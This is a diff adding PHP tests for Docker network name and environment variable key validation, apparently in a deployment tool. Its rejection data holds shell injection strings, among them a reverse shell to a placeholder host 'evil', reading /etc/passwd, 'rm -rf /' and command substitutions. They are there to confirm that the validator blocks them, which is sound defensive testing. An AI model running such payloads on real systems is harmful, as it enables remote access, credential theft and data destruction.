@@ -1,5 +1,6 @@
 <?php
 
+use App\Models\EnvironmentVariable;
 use App\Support\ValidationPatterns;
 
 it('accepts valid names with common characters', function (string $name) {
@@ -79,4 +80,96 @@ it('falls back to random name when repo produces empty name', function () {
 
     expect(mb_strlen($name))->toBeGreaterThanOrEqual(3)
         ->and(preg_match(ValidationPatterns::NAME_PATTERN, $name))->toBe(1);
+});
+
+it('accepts valid Docker network names', function (string $network) {
+    expect(ValidationPatterns::isValidDockerNetwork($network))->toBeTrue();
+})->with([
+    'simple name' => 'mynetwork',
+    'with hyphen' => 'my-network',
+    'with underscore' => 'my_network',
+    'with dot' => 'my.network',
+    'cuid2 format' => 'ck8s2z1x0000001mhg3f9d0g1',
+    'alphanumeric' => 'network123',
+    'starts with number' => '1network',
+    'complex valid' => 'coolify-proxy.net_2',
+]);
+
+it('rejects Docker network names with shell metacharacters', function (string $network) {
+    expect(ValidationPatterns::isValidDockerNetwork($network))->toBeFalse();
+})->with([
+    'semicolon injection' => 'poc; bash -i >& /dev/tcp/evil/4444 0>&1 #',
+    'pipe injection' => 'net|cat /etc/passwd',
+    'dollar injection' => 'net$(whoami)',
+    'backtick injection' => 'net`id`',
+    'ampersand injection' => 'net&rm -rf /',
+    'space' => 'net work',
+    'newline' => "net\nwork",
+    'starts with dot' => '.network',
+    'starts with hyphen' => '-network',
+    'slash' => 'net/work',
+    'backslash' => 'net\\work',
+    'empty string' => '',
+    'single quotes' => "net'work",
+    'double quotes' => 'net"work',
+    'greater than' => 'net>work',
+    'less than' => 'net<work',
+]);
+
+it('generates dockerNetworkRules with correct defaults', function () {
+    $rules = ValidationPatterns::dockerNetworkRules();
+
+    expect($rules)->toContain('required')
+        ->toContain('string')
+        ->toContain('max:255')
+        ->toContain('regex:'.ValidationPatterns::DOCKER_NETWORK_PATTERN);
+});
+
+it('generates nullable dockerNetworkRules when not required', function () {
+    $rules = ValidationPatterns::dockerNetworkRules(required: false);
+
+    expect($rules)->toContain('nullable')
+        ->not->toContain('required');
+});
+
+it('accepts Docker-compatible environment variable keys', function (string $key) {
+    expect(ValidationPatterns::isValidEnvironmentVariableKey($key))->toBeTrue();
+})->with([
+    'letters' => 'APP_ENV',
+    'leading underscore' => '_TOKEN',
+    'railpack control variable' => 'RAILPACK_NODE_VERSION',
+    'digits after first character' => 'NODE_VERSION_20',
+    'starts with digit' => '1BAD',
+    'hyphen' => 'BAD-KEY',
+    'dot' => 'node.name',
+    'uppercase dots' => 'XPACK.SECURITY.ENABLED',
+    'semicolon' => 'BAD;KEY',
+    'space' => 'BAD KEY',
+]);
+
+it('rejects environment variable keys Docker cannot represent', function (string $key) {
+    expect(ValidationPatterns::isValidEnvironmentVariableKey($key))->toBeFalse();
+})->with([
+    'equals' => 'BAD=KEY',
+    'empty' => '',
+]);
+
+it('generates environment variable key rules with correct defaults', function () {
+    $rules = ValidationPatterns::environmentVariableKeyRules();
+
+    expect($rules)->toContain('required')
+        ->toContain('string')
+        ->toContain('max:255')
+        ->toContain('regex:'.ValidationPatterns::ENVIRONMENT_VARIABLE_KEY_PATTERN);
+});
+
+it('normalizes environment variable keys by trimming surrounding whitespace', function () {
+    expect(ValidationPatterns::normalizeEnvironmentVariableKey(' node.name '))->toBe('node.name');
+});
+
+it('normalizes environment variable keys before model validation', function () {
+    $environmentVariable = new EnvironmentVariable;
+    $environmentVariable->key = ' APP_ENV ';
+
+    expect($environmentVariable->key)->toBe('APP_ENV');
 });
